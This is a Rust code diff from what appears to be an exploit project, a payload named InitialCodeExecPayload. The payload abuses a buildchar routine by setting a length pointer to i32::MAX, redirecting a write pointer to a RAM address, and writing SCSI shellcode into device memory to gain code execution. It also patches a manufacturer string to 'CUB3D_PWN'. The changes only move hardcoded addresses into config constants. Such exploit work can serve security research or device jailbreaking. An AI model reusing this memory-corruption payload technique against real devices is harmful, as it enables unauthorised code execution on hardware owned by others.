@@ -14,7 +14,7 @@ impl Payload for InitialCodeExecPayload {
         b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);
 
         // Set our write target to start of ram
-        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);
+        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, Cfg::BUILDCHAR_OVERWRITE_ADDR);
 
         let payload = std::fs::read("./scsi_shellcode/scsi-stub.bin").unwrap();
 
@@ -27,7 +27,7 @@ impl Payload for InitialCodeExecPayload {
                 .expect("Failed to create Capstone object");
 
             let insns = cs
-                .disasm_all(&payload, 0x08005024)
+                .disasm_all(&payload, Cfg::BUILDCHAR_OVERWRITE_ADDR as u64)
                 .expect("Failed to disassemble");
 
             for i in insns.as_ref() {
@@ -39,11 +39,11 @@ impl Payload for InitialCodeExecPayload {
             let mut tmp = [0, 0, 0, 0];
             tmp[..t.len()].copy_from_slice(t);
 
-            b.index_write_array(idx as u16 + 0x5024 / 4, tmp);
+            b.index_write_array(idx as u16 + Cfg::BUILDCHAR_WRITE_OFFSET / 4, tmp);
         }
 
         // Just a bit of fun
-        {
+        if Cfg::PATCH_MFG_STR {
             let s = b"CUB3D_PWN\0";
             const S_BASE: u16 = 0x1320;
 
